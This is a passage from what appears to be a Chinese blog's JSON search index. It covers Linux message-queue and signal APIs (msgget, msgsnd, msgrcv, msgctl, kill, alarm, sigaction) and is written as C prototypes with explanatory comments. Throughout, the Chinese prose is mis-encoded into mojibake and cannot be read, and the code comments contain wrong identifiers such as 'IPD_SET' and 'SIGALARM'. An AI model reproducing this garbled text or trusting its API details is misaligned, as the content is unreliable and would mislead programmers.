å‡½æ•°ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯äº§ç”Ÿå…³é”®å­—å€¼ã€‚ 0x02 Linuxæ¶ˆæ¯é˜Ÿåˆ—ä½¿ç”¨æ­¥éª¤ åˆ›å»ºæˆ–æ‰“å¼€æ¶ˆæ¯é˜Ÿåˆ—ã€‚ä½¿ç”¨çš„å‡½æ•°æ˜¯ msgget()ï¼Œè¿™é‡Œåˆ›å»ºçš„æ¶ˆæ¯é˜Ÿåˆ—çš„æ•°é‡ä¼šå—åˆ°ç³»ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—æ•°é‡çš„é™åˆ¶ã€‚ æ·»åŠ æ¶ˆæ¯ã€‚ä½¿ç”¨çš„å‡½æ•°æ˜¯ msgsnd()ï¼Œå®ƒæŠŠæ¶ˆæ¯æ·»åŠ åˆ°å·²æ‰“å¼€çš„æ¶ˆæ¯é˜Ÿåˆ—æœ«å°¾ã€‚ è¯»å–æ¶ˆæ¯ã€‚ä½¿ç”¨çš„å‡½æ•°æ˜¯ msgrcv()ï¼Œå®ƒæŠŠæ¶ˆæ¯ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–èµ°ï¼Œä¸ FIFO ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œå¯ä»¥å–èµ°æŒ‡å®šçš„æŸä¸€æ¡æ¶ˆæ¯ã€‚ æ§åˆ¶æ¶ˆæ¯é˜Ÿåˆ—ã€‚ä½¿ç”¨çš„å‡½æ•°æ˜¯ msgctl()ï¼Œå®ƒå¯ä»¥å®Œæˆå¤šé¡¹åŠŸèƒ½ã€‚ 0x03 Linuxæ¶ˆæ¯é˜Ÿåˆ—ç›¸å…³ API ä»‹ç» åœ¨ Linux æ“ä½œç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ msgget() å‡½æ•°æ¥åˆ›å»ºå’Œæ‰“å¼€æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå…·ä½“æè¿°å¦‚ä¸‹ï¼š 123456789101112#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;int msgget(key_t key, int msgflg)/*å‚æ•°ï¼š- key æ¶ˆæ¯é˜Ÿåˆ—é”®å€¼ï¼Œå¤šä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡è¿™ä¸ª ID å€¼æ¥è®¿é—®åŒä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå…¶ä¸­æœ‰ä¸ªç‰¹æ®Šå€¼ `IPC_PRIVATE` ç”¨äºåˆ›å»ºå½“å‰è¿›ç¨‹çš„ç§æœ‰æ¶ˆæ¯é˜Ÿåˆ—- msgflg æƒé™æ ‡å¿—ä½è¿”å›å€¼ï¼š æˆåŠŸè¿”å›æ¶ˆæ¯é˜Ÿåˆ— IDï¼Œ å¤±è´¥è¿”å› -1*/ å‘å·²ç»è¢«åˆ›å»ºå’Œæ‰“å¼€çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­å‘é€æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ msgsnd() å‡½æ•°ï¼Œå…·ä½“æè¿°å¦‚ä¸‹ï¼š 1234567891011121314151617181920#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;int msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg)/*å‚æ•°ï¼š- msqid æ¶ˆæ¯é˜Ÿåˆ—çš„é˜Ÿåˆ— ID- msgp æ‰§è¡Œæ¶ˆæ¯ç»“æ„çš„æŒ‡é’ˆï¼Œè¯¥æ¶ˆæ¯ç»“æ„ `msgbuf` é€šå¸¸å¦‚ä¸‹ï¼š struct msgbuf&#123; long mtype; //æ¶ˆæ¯ç±»å‹ char mtext[1];//æ¶ˆæ¯æ­£æ–‡ &#125;- msgsz æ¶ˆæ¯æ­£æ–‡çš„å­—èŠ‚æ•°- msgflg å¦‚ä¸‹ï¼š `IPC_NOWAIT`:è‹¥æ¶ˆæ¯æ— æ³•ç«‹å³å‘ç”Ÿï¼ˆå½“å‰æ¶ˆæ¯é˜Ÿåˆ—å·²æ»¡ï¼Œå‡½æ•°ç«‹å³è¿”å› 0ï¼šmsgsnd() è°ƒç”¨é˜»å¡çŸ¥é“å‘é€æˆåŠŸä¸ºæ­¢å‡½æ•°è¿”å›å€¼ï¼š æˆåŠŸè¿”å› 0ï¼Œ å¤±è´¥è¿”å› -1*/ å¯¹äºæ¶ˆæ¯é˜Ÿåˆ—çš„æ¥æ”¶ï¼Œåœ¨ç¨‹åºä¸­å¯ä»¥é€šè¿‡è°ƒç”¨ msgrcv() æ¥è¿›è¡Œè¯»å–æ•°æ®ï¼Œå¦‚ä¸‹ï¼š 123456789101112131415161718192021#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;int msgrcv(int msqid, void *msgp, size_t msgsz, long int msgtyp, int msgflg)/*å‚æ•°ï¼š- msqid æ¶ˆæ¯é˜Ÿåˆ—çš„é˜Ÿåˆ— ID- msgp æ¶ˆæ¯ç¼“å†²åŒº- msgsz æ­£æ–‡å­—èŠ‚æ•°- msgtyp æè¿°å¦‚ä¸‹ï¼š 0ï¼šæ¥æ”¶æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªæ¶ˆæ¯ å¤§äº0ï¼šæ¥æ”¶æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªç±»å‹ä¸º msgtyp çš„æ¶ˆæ¯ å°äº0ï¼šæ¥æ”¶æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç¬¬ä¸€ä¸ªç±»å‹å€¼ä¸å°äº msgtyp ç»å¯¹å€¼ä¸”å€¼æœ€å°çš„æ¶ˆæ¯- msgflg æè¿°å¦‚ä¸‹ï¼š - MSG_NOERRORï¼šè‹¥è¿”å›çš„æ¶ˆæ¯æ¯” msgsz å­—èŠ‚å¤šï¼Œåˆ™æ¶ˆæ¯å°±ä¼šæˆªæ–­åˆ° msgsz å­—èŠ‚ï¼Œä¸”ä¸ä¼šé€šçŸ¥æ¶ˆæ¯åˆ°è¿›ç¨‹ - IPC_NOWAIT:è‹¥æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ²¡æœ‰ç›¸åº”ç±»å‹çš„æ¶ˆæ¯å¯ä»¥æ¥æ”¶ï¼Œåˆ™å‡½æ•°ä¼šç«‹å³è¿”å› - 0ï¼šå‡½æ•°è°ƒç”¨é˜»å¡ç­‰å¾…æ¥æ”¶åˆ°ä¸€æ¡æ¶ˆæ¯ä¸ºæ­¢è¿”å›å€¼ï¼š æˆåŠŸè¿”å› 0ï¼Œ å¤±è´¥è¿”å› -1*/ é™¤äº†ä¸Šè¿° API ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç”¨ msgctl() å‡½æ•°æ¥å¯¹æ¶ˆæ¯é˜Ÿåˆ—è¿›è¡Œè®¾ç½®ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 12345678910111213141516#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;int msgctl(int msgqid, int cmd, struct msgid_ds *buf)/*å‚æ•°ï¼š- msqid æ¶ˆæ¯é˜Ÿåˆ—çš„é˜Ÿåˆ— ID- cmd æ‰§è¡Œæ“ä½œï¼Œå¦‚ä¸‹ï¼š - IPC_STATï¼šè¯»å–æ¶ˆæ¯é˜Ÿåˆ—çš„æ•°æ®ç»“æ„ msgid_ds ï¼Œå¹¶å°†å…¶å­˜å‚¨åˆ° buf ä½ç½® - IPD_SETï¼šè®¾ç½®æ¶ˆæ¯é˜Ÿåˆ—çš„æ•°æ®ç»“æ„ msgid_ds ä¸­çš„ ipc_perm å€¼ï¼Œè¿™ä¸ªå€¼å–è‡ª buf å‚æ•° - IPC_RMIDï¼šä»ç³»ç»Ÿå†…æ ¸ä¸­åˆ é™¤æ¶ˆæ¯é˜Ÿåˆ—- bufï¼šæè¿°æ¶ˆæ¯é˜Ÿåˆ—çš„ msqid_ds ç»“æ„ç±»å‹çš„å˜é‡è¿”å›å€¼ æˆåŠŸè¿”å› 0ï¼Œ å¤±è´¥è¿”å› -1*/","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘5-è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ä¹‹ä¿¡å·é€šä¿¡","date":"2023-12-25T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘5-è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ä¹‹ä¿¡å·é€šä¿¡/","text":"æ¦‚è¿°ï¼šçŸ¥è¯†ç‚¹ Linux ä¿¡å·æ¦‚è¿° Linux ä¿¡å·é€šä¿¡åŸç† Linux ä¿¡å·ç›¸å…³ API å‡½æ•°ä»‹ç» 0x01 Linuxä¿¡å·æ¦‚è¿° ä¿¡å·æœºåˆ¶æ˜¯ä¸€ç§ä½¿ç”¨ä¿¡å·æ¥è¿›è¡Œè¿›ç¨‹ä¹‹é—´ä¼ é€’æ¶ˆæ¯çš„æ–¹æ³•ï¼Œä¿¡å·çš„å…¨ç§°ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œç®€ç§°è½¯ä¸­æ–­ã€‚å…³äº Linux ä¿¡å·çš„ç‰¹ç‚¹å¯ä»¥æ¦‚æ‹¬å¦‚ä¸‹å‡ ç‚¹ï¼š ä¿¡å·æ˜¯åœ¨è½¯ä»¶å±‚æ¬¡ä¸Šå¯¹ä¸­æ–­æœºåˆ¶çš„ä¸€ç§æ¨¡æ‹Ÿã€‚åœ¨åŸç†ä¸Šï¼Œä¸€ä¸ªè¿›ç¨‹æ”¶åˆ°ä¸€ä¸ªä¿¡å·ä¸å¤„ç†å™¨æ”¶åˆ°ä¸€ä¸ªä¸­æ–­è¯·æ±‚å¯ä»¥è¯´æ˜¯ä¸€æ ·çš„ã€‚ ä¿¡å·æ˜¯å¼‚æ­¥çš„ï¼Œä¸€ä¸ªè¿›ç¨‹ä¸å¿…é€šè¿‡ä»»ä½•æ“ä½œæ¥ç­‰å¾…ä¿¡å·çš„åˆ°è¾¾ï¼Œäº‹å®ä¸Šè¿›ç¨‹ä¹Ÿä¸çŸ¥é“ä¿¡å·åˆ°åº•ä»€ä¹ˆæ—¶å€™åˆ°è¾¾ã€‚ ä¿¡å·å¯ä»¥ç›´æ¥è¿›è¡Œç”¨æˆ·ç©ºé—´è¿›ç¨‹å’Œå†…æ ¸è¿›ç¨‹ä¹‹é—´çš„äº¤äº’ï¼Œå†…æ ¸è¿›ç¨‹ä¹Ÿå¯ä»¥åˆ©ç”¨å®ƒæ¥é€šçŸ¥ç”¨æˆ·ç©ºé—´è¿›ç¨‹å‘ç”Ÿäº†å“ªäº›ç³»ç»Ÿäº‹ä»¶ã€‚å®ƒå¯ä»¥åœ¨ä»»ä½•æ—¶å€™å‘ç»™æŸä¸€ä¸ªè¿›ç¨‹ï¼Œè€Œæ— éœ€çŸ¥é“è¯¥è¿›ç¨‹çš„çŠ¶æ€ã€‚å¦‚æœè¯¥ä¿¡å·å½“å‰å¹¶æœªå¤„äºæ‰§è¡Œæ€(Running),åˆ™è¯¥ä¿¡å·ç”±å†…æ ¸ä¿å­˜èµ·æ¥ï¼Œç›´åˆ°è¯¥è¿›ç¨‹æ¢å¤æ‰§è¡Œå†ä¼ é€’ç»™å®ƒä¸ºæ­¢ã€‚å¦‚æœä¸€ä¸ªä¿¡å·è¢«è¿›ç¨‹è®¾ç½®ä¸ºé˜»å¡ï¼Œåˆ™è¯¥ä¿¡å·çš„ä¼ é€’è¢«å»¶è¿Ÿï¼Œç›´åˆ°å…¶é˜»å¡è¢«å–æ¶ˆæ—¶æ‰è¢«ä¼ é€’ç»™è¿›ç¨‹ã€‚ ä¿¡å·æ˜¯è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ä¸­å”¯ä¸€çš„å¼‚æ­¥é€šä¿¡æœºåˆ¶ï¼Œå¯ä»¥çœ‹ä½œæ˜¯å¼‚æ­¥é€šçŸ¥ï¼Œé€šçŸ¥æ¥æ”¶ä¿¡å·çš„è¿›ç¨‹æœ‰å“ªäº›äº‹ä»¶å‘ç”Ÿäº†ã€‚ä¿¡å·æœºåˆ¶é™¤äº†åŸºæœ¬é€šçŸ¥å¤–ï¼Œè¿˜å¯ä»¥ä¼ é€’é™„åŠ ä¿¡æ¯ã€‚ åœ¨ Linux ç³»ç»Ÿå†…æ ¸å¤´æ–‡ä»¶ signal.h ä¸­å®šä¹‰æœ‰ 64 ç§ä¿¡å·ï¼Œè¿™äº›ä¿¡å·éƒ½æ˜¯ä»¥ SIG å¼€å¤´ï¼Œä¸”éƒ½è¢«å®šä¹‰ä¸ºæ­£æ•´æ•°ã€‚é™¤äº†é€šè¿‡æŸ¥çœ‹ signal.h å¤´æ–‡ä»¶èƒ½å¤Ÿçœ‹åˆ°ä¿¡å·çš„åå­—å’Œå®šä¹‰å¤–ï¼Œè¿˜å¯ä»¥åœ¨ Linux ç³»ç»Ÿä¸‹ä½¿ç”¨å‘½ä»¤ kill -l æ¥æŸ¥çœ‹ä¿¡å·çš„åå­—ä»¥åŠåºå·ï¼Œä¿¡å·éƒ½æ˜¯ä» 1 å¼€å§‹ç¼–å·çš„ï¼Œä¸å­˜å­ 0 å·ä¿¡å·ã€‚å…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤º(ç”±äºå®éªŒç¯å¢ƒé‡‡ç”¨è™šæ‹Ÿå®¹å™¨ï¼Œæ‰€ä»¥æ‰§è¡Œ kill -l å¹¶ä¸ä¼šæœ‰ç»“æœæ˜¾ç¤º)ï¼š 0x02 Linuxä¿¡å·é€šä¿¡åŸç† è¦ææ¸…æ¥šä¿¡å·é€šä¿¡çš„åŸç†ï¼Œå°±éœ€è¦ææ¸…æ¥šä¿¡å·çš„äº§ç”Ÿã€ä¼ è¾“ä»¥åŠå“åº”ã€‚ ä¿¡å·æ—¶é—´äº§ç”Ÿå…¶å®å°±æ˜¯ä¿¡å·çš„æ¥æºï¼Œå¯¹äº Linux æ“ä½œç³»ç»Ÿæ¥è¯´ä¿¡å·çš„ä¸»è¦æ¥æºå¯ä»¥å½’çº³ä¸ºä»¥ä¸‹ä¸¤ç‚¹ï¼š ç¡¬ä»¶æ¥æºã€‚å¦‚æˆ‘ä»¬æŒ‰ä¸‹äº†é”®ç›˜ä¸Šçš„æŒ‰é’® æˆ–è€…å‡ºç°å…¶ä»–ç¡¬ä»¶æ•…éšœï¼› è½¯ä»¶æ¥æºã€‚æœ€å¸¸ç”¨å‘é€ä¿¡å·çš„ç³»ç»Ÿå‡½æ•°æœ‰ kill()ã€raise()ã€alarm()ã€setitimer() å’Œ sigqueue()ç­‰ï¼Œè½¯ä»¶æ¥æºè¿˜åŒ…æ‹¬ä¸€äº›éæ³•è¿ç®—ç­‰æ“ä½œã€‚ è€Œå¯¹äºä¿¡å·åœ¨äº§ç”Ÿä¹‹åï¼ŒLinux å¯¹æ¯ä¸ªä¿¡å·éƒ½æœ‰ä¸€ä¸ªç¼ºçœçš„åŠ¨ä½œï¼Œå…¸å‹çš„ç¼ºçœåŠ¨ä½œå°±æ˜¯ç»ˆæ­¢è¿›ç¨‹ï¼Œå½“è¿™ä¸ªä¿¡å·çš„è¿›ç¨‹æ”¶åˆ°ä¿¡å·åä¼šæ ¹æ®è¿™ä¸ªä¿¡å·çš„å…·ä½“æƒ…å†µæä¾›ä»¥ä¸‹ä¸‰ç§ä¸åŒçš„å¤„ç†æ–¹å¼ï¼š å¿½ç•¥ä¿¡å·ã€‚å¿½ç•¥ä¿¡å·å³å¯¹ä¿¡å·ä¸åšå¤„ç†ï¼Œå…¶ä¸­ï¼Œæœ‰ä¸¤ä¸ªä¿¡å·ä¸èƒ½å¿½ç•¥ï¼šSIGKILL å’Œ SIGSTOPã€‚ æ•æ‰ä¿¡å·ã€‚å®šä¹‰ä¿¡å·å¤„ç†å‡½æ•°ï¼Œå½“ä¿¡å·å‘ç”Ÿæ—¶ï¼Œæ‰§è¡Œå“åº”çš„å¤„ç†å‡½æ•°ã€‚ æ‰§è¡Œé»˜è®¤æ“ä½œã€‚Linux å¯¹æ¯ç§ä¿¡å·éƒ½è§„å®šäº†é»˜è®¤æ“ä½œã€‚ å¯¹åº”éƒ¨åˆ†ç³»ç»Ÿå®šä¹‰çš„ä¿¡å·ï¼ŒLinux ç³»ç»Ÿéƒ½è§„å®šäº†ä¸€äº›é»˜è®¤æ“ä½œä½œä¸ºä¿¡å·çš„å“åº”å¤„ç†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¸€ä¸ªå®Œæ•´çš„ä¿¡å·ç”Ÿå‘½å‘¨æœŸå¯ä»¥åˆ†ä¸º 3 ä¸ªé‡è¦é˜¶æ®µï¼Œè¿™ 3 ä¸ªé˜¶æ®µç”± 4 ä¸ªé‡è¦äº‹ä»¶æ¥åˆ»ç”»çš„ï¼›ä¿¡å·äº§ç”Ÿã€ä¿¡å·åœ¨è¿›ç¨‹ä¸­æ³¨å†Œã€ä¿¡å·åœ¨è¿›ç¨‹ä¸­æ³¨é”€ã€æ‰§è¡Œä¿¡å·å¤„ç†å‡½æ•°ã€‚è¿™é‡Œä¿¡å·çš„äº§ç”Ÿã€æ³¨å†Œã€æ³¨é”€ç­‰æ˜¯æŒ‡ä¿¡å·çš„å†…éƒ¨å®ç°æœºåˆ¶ï¼Œè€Œä¸æ˜¯ä¿¡å·çš„å‡½æ•°å®ç°(ä¸å—æˆ‘ä»¬çš„æŒæ§)ã€‚å› æ­¤ä¿¡å·æ³¨å†Œä¸å¦ä¸åé¢è®²åˆ°çš„å‘é€ä¿¡å·å‡½æ•°ï¼ˆå¦‚ kill() ç­‰ï¼‰åŠä¿¡å·å®‰è£…å‡½æ•°ï¼ˆå¦‚ signal() ç­‰ï¼‰æ— å…³ï¼Œåªä¸ä¿¡å·å€¼æœ‰å…³ã€‚ ç›¸é‚»ä¸¤ä¸ªäº‹ä»¶çš„æ—¶é—´é—´éš”æ„æˆä¿¡å·ç”Ÿå‘½å‘¨æœŸçš„ä¸€ä¸ªé˜¶æ®µï¼Œå¦‚ä¸‹å›¾.æ³¨æ„è¿™é‡Œçš„ä¿¡å·å¤„ç†æœ‰å¤šç§æ–¹å¼ï¼Œä¸€èˆ¬æ˜¯ç”±å†…æ ¸å®Œæˆçš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”±ç”¨æˆ·è¿›ç¨‹æ¥å®Œæˆã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¿¡å·çš„å¤„ç†åŒ…æ‹¬ä¿¡å·çš„å‘é€ã€æ•æ‰å’Œå¤„ç†ï¼Œå®ƒä»¬æœ‰å„è‡ªç›¸å¯¹åº”çš„å¸¸è§å‡½æ•°ï¼š å‘ç”Ÿä¿¡å·çš„å‡½æ•°: kill()ã€raise() æ•æ‰ä¿¡å·çš„å‡½æ•°: alarm()ã€pause() å¤„ç†ä¿¡å·çš„å‡½æ•°: signal()ã€sigaction() 0x03 Linux ä¿¡å·ç›¸å…³ API å‡½æ•°ä»‹ç» å‰é¢å…¶å®å·²ç»æåˆ°äº†å¾ˆå¤š Linux ä¿¡å·æœºåˆ¶ç›¸å…³çš„å‡½æ•°ã€‚ä¸‹é¢å°±åˆ†åˆ«é•œåƒè®²è§£å’Œä»‹ç»ã€‚ kill() å‡½æ•°åŒå’±ä»¬çš„ kill ç³»ç»Ÿå‘½ä»¤ä¸€æ ·ï¼ˆä½†ä¸èƒ½çœŸçš„è®¤ä¸º kill() å°±æ˜¯ killï¼‰ï¼Œå¯ä»¥å‘é€ä¿¡å·ç»™è¿›ç¨‹æˆ–è¿›ç¨‹ç»„ï¼ˆå®é™…ä¸Šï¼Œkill ç³»ç»Ÿå‘½ä»¤åªæ˜¯ kill() å‡½æ•°çš„ä¸€ä¸ªç”¨æˆ·æ¥å£ï¼‰ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œkill() å‡½æ•°ä¸ä»…å¯ä»¥ç»ˆæ­¢è¿›ç¨‹ï¼ˆå®é™…ä¸Šæ˜¯é€šè¿‡å‘å‡º SIGKILL ä¿¡å·ç»ˆæ­¢ï¼‰ï¼Œä¹Ÿå¯ä»¥å‘è¿›ç¨‹å‘é€å…¶ä»–ä¿¡å·ã€‚å…·ä½“æè¿°å¦‚ä¸‹ï¼š 1234567891011121314#include &lt;signal.h&gt;#include &lt;sys/types.h&gt;int kill(pid_t pid, int sig);/*å‚æ•°ï¼š - pidï¼šè¦å‘é€ä¿¡å·çš„è¿›ç¨‹å· 0 ä¿¡å·è¢«å‘é€ç»™æ‰€æœ‰å’Œå½“å‰è¿›ç¨‹åœ¨åŒä¸€è¿›ç¨‹ç»„çš„è¿›ç¨‹å· -1 ä¿¡å·å‘ç»™æ‰€æœ‰çš„è¿›ç¨‹è¡¨ä¸­çš„è¿›ç¨‹ï¼ˆé™¤äº†è¿›ç¨‹å·æœ€å¤§çš„è¿›ç¨‹ä¹‹å¤–ï¼‰ &lt;-1 ä¿¡å·å‘é€ç»™è¿›ç¨‹ç»„å¥½ä¸º -pid çš„æ¯ä¸€ä¸ªè¿›ç¨‹ - sigï¼šä¿¡å·è¿”å›å€¼ æˆåŠŸï¼š0 å¤±è´¥ï¼š-1*/ ä¸ kill() å‡½æ•°ä¸åŒçš„æ˜¯ï¼Œraise() å‡½æ•°å…è®¸è¿›ç¨‹å‘è‡ªèº«å‘é€ä¿¡å·ã€‚å…·ä½“æè¿°å¦‚ä¸‹ï¼š 12345678910#include &lt;signal.h&gt;#include &lt;sys/types.h&gt;int raise(int sig);/*å‚æ•° - sigï¼šä¿¡å·è¿”å›å€¼ æˆåŠŸï¼š0 å¤±è´¥ï¼š-1*/ é™¤äº†ä¸Šé¢çš„ä¿¡å·å‘é€å‡½æ•°ï¼ŒLinux è¿˜å®šä¹‰äº†ä¸¤ä¸ªä¿¡å·æ•æ‰å‡½æ•°ç”¨æ¥æ¥æ”¶ä¿¡å· alarm() å’Œ pause() ã€‚ alarm() ä¹Ÿç§°ä¸ºé—¹é’Ÿå‡½æ•°ï¼Œå®ƒå¯ä»¥åœ¨è¿›ç¨‹ä¸­è®¾ç½®ä¸€ä¸ªå®šæ—¶å™¨ï¼Œå½“å®šæ—¶å™¨æŒ‡å®šçš„æ—¶é—´åˆ°æ—¶ï¼Œå®ƒå°±å‘è¿›ç¨‹å‘é€ SIGALARM ä¿¡å·ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€ä¸ªè¿›ç¨‹åªèƒ½æœ‰ä¸€ä¸ªé—¹é’Ÿæ—¶é—´ï¼Œå¦‚æœåœ¨è°ƒç”¨ alarm() ä¹‹å‰å·²è®¾ç½®è¿‡é—¹é’Ÿæ—¶é—´ï¼Œåˆ™ä»»ä½•ä»¥å‰çš„é—¹é’Ÿæ—¶é—´éƒ½è¢«æ–°å€¼æ‰€ä»£æ›¿ã€‚å…·ä½“æè¿°å¦‚ä¸‹ï¼š 12345678910#include &lt;unistd.h&gt;unsigned int alarm(unsigned int seconds)/*å‚æ•° secondsï¼šæŒ‡å®šç§’æ•°ï¼Œç³»ç»Ÿç»è¿‡ seconds åä¼šå‘è¯¥è¿›ç¨‹å‘é€ SIGALRM ä¿¡å·è¿”å›å€¼ æˆåŠŸï¼šå¦‚æœè°ƒç”¨æ­¤ alarm() å‰å·²ç»è®¾ç½®å¥½é—¹é’Ÿæ—¶é—´ï¼Œåˆ™è¿”å›ä¸Šä¸€ä¸ªé—¹é’Ÿå‰©ä½™æ—¶é—´ï¼Œå¦åˆ™è¿”å› 0 å¤±è´¥ï¼š-1*/ pause() å‡½æ•°ç”¨äºå°†è°ƒç”¨è¿›ç¨‹æŒ‚èµ·ç›´è‡³æ•æ‰åˆ°ä¿¡å·ä¸ºæ­¢ã€‚è¿™ä¸ªå‡½æ•°å¾ˆå¸¸ç”¨ï¼Œé€šå¸¸å¯ä»¥ç”¨äºåˆ¤æ–­ä¿¡å·æ˜¯å¦å·²åˆ°ã€‚å…·ä½“æè¿°å¦‚ä¸‹ï¼š 1234567#include &lt;unistd.h&gt;int pause(void)/*è¿”å›å€¼ å‡ºé”™è¿”å› -1ï¼Œå¹¶è®¾ç½® errno*/ Linux ä¿¡å·å¤„ç†çš„æ–¹æ³•ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š ä½¿ç”¨ signal() å‡½æ•° ä½¿ç”¨ä¿¡å·é›†å‡½æ•°ç»„ ä½¿ç”¨ signal() å‡½æ•°å¤„ç†æ—¶ï¼Œåªéœ€æŒ‡å‡ºè¦å¤„ç†çš„ä¿¡å·å’Œå¤„ç†å‡½æ•°å³å¯ã€‚å®ƒä¸»è¦ç”¨äºå‰ 32 ç§éå®æ—¶ä¿¡å·çš„å¤„ç†ï¼Œä¸æ”¯æŒä¿¡å·ä¼ é€’ä¿¡æ¯ã€‚Linux è¿˜æ”¯æŒä¸€ä¸ªæ›´å¥å£®æ›´æ–°çš„ä¿¡å·å¤„ç†å‡½æ•°å‘¢ï¼Œå®ƒå°±æ˜¯ sigaction()ï¼ŒUnix ç¯å¢ƒç¼–ç¨‹ç­‰ä¹¦ç±å…¶å®éƒ½æ˜¯æ¨èä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚å…·ä½“å‡½æ•°ä»‹ç»å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031#include &lt;signal.h&gt;typedef void (*sighandler_t)(int);sighandle_t signal(int signum, sighandler_t handler);/*å‚æ•°ï¼š signumï¼šæŒ‡å®šä¿¡å·ä»£ç  handlerï¼šSIG_IGN - å¿½ç•¥è¯¥ä¿¡å· SIG_DFL - é‡‡ç”¨ç³»ç»Ÿé»˜è®¤æ–¹å¼å¤„ç†ä¿¡å· è‡ªå®šä¹‰çš„ä¿¡å·å¤„ç†å‡½æ•°æŒ‡é’ˆè¿”å›å€¼ï¼š æˆåŠŸï¼šä¹‹å‰çš„ä¿¡å·å¤„ç†é…ç½® å¤±è´¥ï¼›-1*/#include &lt;signal.h&gt;struct sigaction&#123; void (*sa_handler)(int signo); //å‡½æ•°æŒ‡é’ˆï¼ŒæŒ‡å®šä¿¡å·å¤„ç†å‡½æ•°ï¼Œå¯ä»¥æ˜¯ SIG_DFLï¼ˆé»˜è®¤å¤„ç†æ–¹å¼ï¼‰å’Œ SIG_IGNï¼ˆå¿½ç•¥ä¿¡å·ï¼‰ sigset_t sa_mask; //ä¿¡å·é›†ï¼ŒæŒ‡å®šåœ¨å¤„ç†ä¸­å±è”½å“ªäº›ä¿¡å· int sa_flags; //ä¿¡å·æ ‡å¿—ä½ï¼ŒåŒ…å«å¯¹ä¿¡å·å¤„ç†çš„å„ä¸ªé€‰æ‹©é¡¹ void (*sa_restore)(void);&#125;;int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);/*å‚æ•°ï¼š signum ä¿¡å·ä»£ç ï¼Œå¯ä»¥æ˜¯é™¤äº† SIGKILL SIGSTOP ä¹‹å¤–çš„ä»»ä½•ä¸€ä¸ªç‰¹å®šæœ‰æ•ˆçš„ä¿¡å· act æ‰§è¡Œç»“æ„ä½“ sigaction çš„ä¸€ä¸ªå®ä¾‹æŒ‡é’ˆï¼ŒæŒ‡å®šå¯¹ç‰¹å®šä¿¡å·çš„å¤„ç† oldact ä¿å­˜åŸæ¥å¯¹ç›¸åº”ä¿¡å·çš„å¤„ç†è¿”å›å€¼ï¼š æˆåŠŸï¼š0 å¤±è´¥ï¼š-1*/ ä½¿ç”¨ä¿¡å·é›†å‡½æ•°ç»„å¤„ç†ä¿¡å·æ—¶è®¾è®¡ä¸€ç³»åˆ—çš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°æŒ‰ç…§å…ˆåçš„è°ƒç”¨æ¬¡åºå¯åˆ†ä¸ºä»¥ä¸‹å‡ å¤§æ¨¡å—ï¼šåˆ›å»ºä¿¡å·é›†ã€æ³¨å†Œä¿¡å·å¤„ç†å‡½æ•°åŠæ£€æµ‹ä¿¡å·ã€‚ å…¶ä¸­ï¼Œåˆ›å»ºä¿¡å·é›†ä¸»è¦ç”¨äºå¤„ç†ç”¨æˆ·æ„Ÿå…´è¶£çš„ä¸€äº›ä¿¡å·ï¼Œå…¶å‡½æ•°åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªï¼š sigemptyset(): å°†ä¿¡å·é›†åˆå§‹åŒ–ä¸ºç©º sigfillset(): å°†ä¿¡å·é›†åˆå§‹åŒ–ä¸ºåŒ…å«æ‰€æœ‰å·²å®šä¹‰çš„ä¿¡å·é›† sigaddset(): å°†æŒ‡å®šä¿¡å·åŠ 